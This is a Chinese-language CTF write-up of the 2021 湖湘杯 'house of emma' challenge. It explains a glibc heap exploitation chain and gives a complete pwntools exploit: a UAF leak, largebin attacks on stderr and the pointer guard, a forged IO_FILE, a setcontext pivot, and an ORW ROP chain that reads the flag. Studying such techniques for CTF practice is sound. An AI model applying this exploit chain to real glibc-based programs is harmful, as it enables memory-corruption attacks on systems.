---
title: 湖湘杯-2021-house of emma
tags:
    - house of XXX
    - pwn
categories:
    - 比赛记录
cover: /img/治不开心药.png
---
# 湖湘杯-2021-house of emma

## 前言

学习`house of emma `的过程中找到了他的出处,遂体会

## 静态分析

因为网上的题解(应该是出题人的分享),重点在说明`house of emma` 这个手法的利用链.但是自己在写题还是不能忽视其他的步骤

当然,每个函数都分析的话,有些浪费笔墨,所以我也只会分析我觉得重要的地方.

### main

![image.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251003165813221.png)

其实,刚开始看到这也只是看到,一次读入了`0x500`字节,也不知道是干啥. 在看完`menu`函数之后,才反应过来程序的一个流程. 这里的`while(1)`,让程序一直循环.

包括在`menu`里,也是一直循环,所以这里没有常规的方法可以触发`exit()`.而且这里,所有的`opcode`,都是一次输入.

### menu

![](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251003170338829.png)

这里主要是要确认`opcode`的格式, 每个`opcode`第一个字节是选项,然后是`idx`,`add()`和`edit()`需要`size`,`edit()`还需要`content`

在这里的`case 5,`给了我们一个重头再来的机会,让我们可以在泄露地址信息之后回来.

### add

![image.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251003170858151.png)

`add()`里对堆块的大小和数量,作了一定的限制.并且使用的是`calloc`,会清空堆块里的原始数据.

还有在`delete()`里`free` 后没有清空指针造成的`uaf`

### seccomp

![image.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251003171555287.png)

当然,不要忘了这题开了沙箱,专门限制了`execve `,所以只能`orw`
## 思路分析

1. 首先是泄露`libc` 和 `heap` 地址,可以直接利用`uaf` 和`show()`函数做到.
2. 使用 `LargeBin Attack` 来在` stderr` 指针处写一个可控地址
3. 使用 `LargeBin Attack` 在`__pointer_chk_guard` 处写一个已知地址
4. 通过写入的已知地址与需要调用的函数指针进行构造加密，同时构造出合理的` IO_FILE` 结构
5. 利用 Unsorted Bin 会与 Top Chunk 合并的机制来修改 Top Chunk 的 Size，从而触发 [House OF Kiwi](https://www.anquanke.com/post/id/235598) 中的 IO 调用
6. 进入 `House_OF_Emma` 的调用链，同时寻找一个能够转移 rdi 到 rdx 的 gadget，利用这个 gadget 来为 `Setcontext` 提供内容
7. 利用 `Setcontext` 来执行 `ROP` 来 `ORW`

## exp详解

在这里，largebin attack的部分就简单略过描写，我们的重点还是后续伪造`fake IO`

### 泄露地址

以泄露`libc`为例,首先准备四个堆块.其中一个堆块略大于其他堆块是为后续利用准备.由于本程序的限制,让最小能申请到的堆块都会进入`unsorted bin`.

所以我们在free 一个堆块后,再申请一个更大的堆块,就可以把他放入`largebins`.第一次直接`show()`,即可泄露`libc`地址.而要泄露`heap`地址,要先利用`edit()`修改`fd`和`bk`,这样才能把`fd_nextsize`的内容,也就是`chunk2`的地址

```python
add(0,0x410)
add(1,0x410)
add(2,0x420)
add(3,0x410)
delete(2)
add(4,0x430)
show(2)
run()
io.recvuntil("Del Done\nMalloc Done\n")
libc_base=u64(io.recv(6).ljust(8,b"\x00"))-0x1f30b0
logv("libc_base",hex(libc_base))
```


### largebins attack

以修改`stderr`为例,此时有之前`free`的`chunk2`,现在`free`掉`chunk0`.此时如果正常,前面再申请一个更大的堆块,结果就是`chunk0`,会链入`largebins`.

现在,先修改`chunk2`的`bk_nextsize`,再申请大堆块,就可以往`target`里写入`chunk2`的地址.
所以成功之后,`sterr` 就被修改为了`chunk2`

把`chunk2` 和 `chunk0` 改好是为了后续的持续利用
```python
delete(0)
payload = p64(libc_base + 0x1f30b0)*2 + p64(heap_base +0x2ae0) + p64(stderr - 0x20)
edit(2,payload)
add(5,0x430)
edit(2, p64(heap_base + 0x22a0) + p64(libc_base + 0x1f30b0) + p64(heap_base + 0x22a0) * 2)
edit(0, p64(libc_base + 0x1f30b0) + p64(heap_base + 0x2ae0) * 3)
add(0, 0x410)
add(2, 0x420)
run()   
```

关于`largebins attack` 的详细利用及原理,不在本文讲解,将在其他文章详细分析

### 修改top chunk size

这里是`exp`中的`93-102`行,这里的`chunk7` ,`size`是`0x450`. `free`掉会被`top chunk`合并.我们再次申请`0x430`大小的chunk 8.

通过`uaf`留下的`chunk7`的`size` 和 指针,我们就可以修改到`top chunk`的`size`.

```python
add(7, 0x450)
edit(2, p64(heap_base + 0x22a0) + p64(libc_base + 0x1f30b0) + p64(heap_base + 0x22a0) * 2)
edit(0, p64(libc_base + 0x1f30b0) + p64(heap_base + 0x2ae0) * 3)
add(2, 0x420)
add(0, 0x410)
run()
delete(7)
add(8, 0x430)
edit(7,b'a' * 0x438 + p64(0x300))
run()
```

### fake io 及 最后的利用链

总算是到了我们本题的重点.首先我们要明确执行到这一步,程序的一个情况.我们最后把`top chunk`的`size`修改为了`0x300`(当然,你想改成多少,就改成多少),然后我们通过申请比这个`size`大的堆块来触发`sysmalloc`,继而触发`__malloc_assert`.

触发之后,会先调用`fxprintf`.经过几层调用之后,会在`__vfprintf_internal`里有如下调用:

![call ](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251006204940659.png)

正常情况下`rbx`是`stderr`的`vatable`,这已经被我们替换为了`fake io`的对应部分.这里我们按照出题者的想法,把这替换成`_io_cookie_jumps+0x38`,这样可以调用`_io_cookie_read`.
接着往下看:

![image.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251006205743073.png)

这里算是`house of emma`的起点.现在的思路是,利用`setcontext`去控制程序的执行流(因为这里可以控制rsp的位置)但是这个版本的`setcontext`的参数控制都是通过`rdx`来的,所以我们现在需要控制`rdx`

通过这样的指令,我们可以找到需要的gadgets.为什么这么搜? 首先,`grep "rdx"`不用过多解释吧. `mov` 是赋值的,也不多说.为什么最后是`call` 呢? 因为我们现在不能控制栈,所以我们希望有`call`和`jmp` 这样的指令,可以跳转.就解释到这

```python
ROPgadget --binary libc.so.6 --only "mov|call" |grep "rdx"
```

![image.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251006210955555.png)

这条gadget可以利用.首先rdi已经被控制为了`fake io+0xe0`里的地址,所以这里的`rdi+8` 和它里面的内容都可以控制.然后,修改了rsp里的内容,无影响.最后调用`rdx+20`里的内容.

所以,最后的rdx是 `[[fake io+0xe0]+8]`,这里注意控制.然后我们控制`[rdx+0x20]`为`setcontext+61`,接着就会执行`setcontext+61`.

![image.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251006212459421.png)

第一行就是关键代码,这里我们往`fake io`后面继续布置.将`rdx `改到`fake io`上的某个地址,然后在对应的偏移,继续设置为堆上地址(就是布置的`orw`的地址).如下图:

![image.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251006212914484.png)

然后,需要注意的是`rcx`,而且它会`push rcx`,并且在后续会`ret`.所以我们要让`rcx`的内容是`ret`指令,这个很简单,只要在`ORW`的上方布置一个`ret gadget`的地址就行了.

![image.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251006213147692.png)


然后就是正常的`orw`的执行了

伪造`fake io`的过程,需要配合动调实时查看,一开始一次完成构造不太现实.中间对于偏移的计算也会出现一些问题.

当然熟练之后,可以把这个写成模板,以后遇到类似的利用就可以直接套用模板来写.
## exp
```python
from esy import *
context.log_level="debug"
context.terminal=['tmux','splitw','-h','-l','66%']
io,elf=loadfile("./pwn","",0)
libc=ELF("./libc.so.6")
opcode=b""
def add(idx,size):
    global opcode
    opcode+=p8(1)+p8(idx)+p16(size)

def delete(idx):
    global opcode
    opcode+=p8(2)+p8(idx)

def show(idx):
    global opcode
    opcode+=p8(3)+p8(idx)

def edit(idx,content):
    global opcode
    opcode+=p8(4)+p8(idx)+p16(len(content))+content
    
def run():
    global opcode
    opcode += p8(5)
    io.sendafter("Pls input the opcode",opcode)
    opcode=b""

def rotate_left_64(x, n):
    # 确保移动的位数在0-63之间
    n = n % 64
    # 先左移n位
    left_shift = (x << n) & 0xffffffffffffffff
    # 然后右移64-n位，将左移时超出的位移动回来
    right_shift = (x >> (64 - n)) & 0xffffffffffffffff
    # 合并两部分
    return left_shift | right_shift

script='''
b *$rebase(0x18B6)
b *$rebase(0x12D7)
b __vfprintf_internal
'''
gdb.attach(io,script)

#---------------------------------- leak libc
add(0,0x410)
add(1,0x410)
add(2,0x420)
add(3,0x410)
delete(2)
add(4,0x430)
show(2)
run()
io.recvuntil("Del Done\nMalloc Done\n")
libc_base=u64(io.recv(6).ljust(8,b"\x00"))-0x1f30b0
logv("libc_base",hex(libc_base))
pop_rdi=libc_base+0x2daa2
pop_rsi=libc_base+0x37c0a
pop_rdx_r12=libc_base+0x1066e1
pop_rax=libc_base+0x446c0
syscall=libc_base+0x883b6 
stderr=libc_base+libc.sym["stderr"]
setcontext=libc_base+libc.sym["setcontext"]
open_addr=libc_base+libc.sym["open"]
read_addr=libc_base+libc.sym["read"]
write=libc_base+libc.sym["write"]

_IO_cookie_jumps = libc_base + 0x1f3ae0
guard = libc_base+ 0x2cc770
#----------------------------------leak heap
edit(2,b'a'*0x10)
show(2)
run()
io.recvuntil("a"*0x10)
heap_base=u64(io.recv(6).ljust(8,b"\x00"))-0x2ae0
logv("heap",hex(heap_base))
#----------------------------------largein attack stderr 
delete(0)
payload = p64(libc_base + 0x1f30b0)*2 + p64(heap_base +0x2ae0) + p64(stderr - 0x20)
edit(2,payload)
add(5,0x430)
edit(2, p64(heap_base + 0x22a0) + p64(libc_base + 0x1f30b0) + p64(heap_base + 0x22a0) * 2)
edit(0, p64(libc_base + 0x1f30b0) + p64(heap_base + 0x2ae0) * 3)
add(0, 0x410)
add(2, 0x420)
run()   
#----------------------------------largebin attack guard , TLS 地址偏移不固定，直接手改吧
delete(2)
add(6,0x430)
delete(0)
edit(2, p64(libc_base + 0x1f30b0) * 2 + p64(heap_base + 0x2ae0) + p64(guard - 0x20))
add(7, 0x450)
edit(2, p64(heap_base + 0x22a0) + p64(libc_base + 0x1f30b0) + p64(heap_base + 0x22a0) * 2)
edit(0, p64(libc_base + 0x1f30b0) + p64(heap_base + 0x2ae0) * 3)
add(2, 0x420)
add(0, 0x410)
run()
delete(7)
add(8, 0x430)
edit(7,b'a' * 0x438 + p64(0x300))
run()
#----------------------------------写 orw
flag = heap_base + 0x22a0 + 0x260
orw = p64(pop_rdi)+p64(flag)
orw+= p64(pop_rsi)+p64(0)
orw+= p64(pop_rax)+p64(2)
orw+= p64(syscall)

orw+= p64(pop_rdi)+p64(3)
orw+= p64(pop_rsi)+p64(heap_base+0x1050)
orw+= p64(pop_rdx_r12)+p64(0x30)+p64(0)
orw+= p64(read_addr)

orw+= p64(pop_rdi)+p64(1)
orw+= p64(pop_rsi)+p64(heap_base+0x1050)
orw+= p64(pop_rdx_r12)+p64(0x30)+p64(0)
orw+= p64(write)
#----------------------------------伪造fake io
chunk0 = heap_base + 0x22a0
gadget = libc_base + 0x146020  # mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
xor_key = chunk0
fake_io = p64(0) + p64(0) # IO_read_end IO_read_base
fake_io += p64(0) + p64(0) + p64(0) # IO_write_base IO_write_ptr IO_write_end
fake_io += p64(0) + p64(0) # IO_buf_base IO_buf_end
fake_io += p64(0)*8 #_IO_save_base ~ _codecvt
fake_io += p64(heap_base) + p64(0)*2  #_lock   _offset  _codecvt
fake_io = fake_io.ljust(0xc8,b'\x00')

fake_io += p64(_IO_cookie_jumps+0x38) #vtable 0xd8
rdi_data = chunk0 + 0xf0
rdx_data = chunk0 + 0xf0

encrypt_gadget = rotate_left_64(gadget^xor_key,0x11)
fake_io += p64(rdi_data) # 0xe0
fake_io += p64(encrypt_gadget) # 0xe8
fake_io += p64(0) + p64(rdx_data) # 0xf0,0xf8
fake_io += p64(0)*2 + p64(setcontext + 61) #0x100,0x108,0x110
fake_io += p64(0xdeadbeef)
fake_io += b'a'*(0xa0 - 0x30)
# fake_io += p64(0)*2
fake_io += p64(chunk0+0x1a0)+p64(pop_rdi+1)
fake_io += orw
fake_io += p64(0xdeadbeef)
fake_io += b'flag\x00\x00\x00\x00'
edit(0,fake_io)
run()
#---------------------------------- house of emma
add(9,0x4c0)
run()

io.interactive()
```